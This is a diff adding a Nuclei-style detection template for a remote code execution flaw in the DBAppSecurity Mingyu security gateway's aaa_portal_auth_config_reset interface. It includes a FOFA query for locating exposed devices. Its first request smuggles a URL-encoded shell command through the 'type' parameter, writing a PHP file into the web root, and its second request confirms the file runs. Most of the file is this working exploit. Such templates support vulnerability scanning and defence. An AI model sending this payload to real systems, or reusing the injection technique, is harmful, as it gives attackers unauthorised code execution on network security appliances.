@@ -1,0 +1,35 @@
+id: dbappsec-gateway-aaa_portal_auth_config_reset-rce
+
+info:
+  name: "安恒明御安全网关 aaa_portal_auth_config_reset 接口远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="明御安全网关"
+        安恒明御安全网关是集成防火墙、入侵检测、防病毒网关等模块的下一代安全防护系统，采用资产视角实现全流程防御。该产品aaa_portal_auth_config_reset接口存在远程代码执行缺陷，攻击者可利用该漏洞实现对服务器的未授权访问和控制。
+  tags: 安恒明御安全网关
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22NdayTest%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2FNTest.php%0a HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Connection: close
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
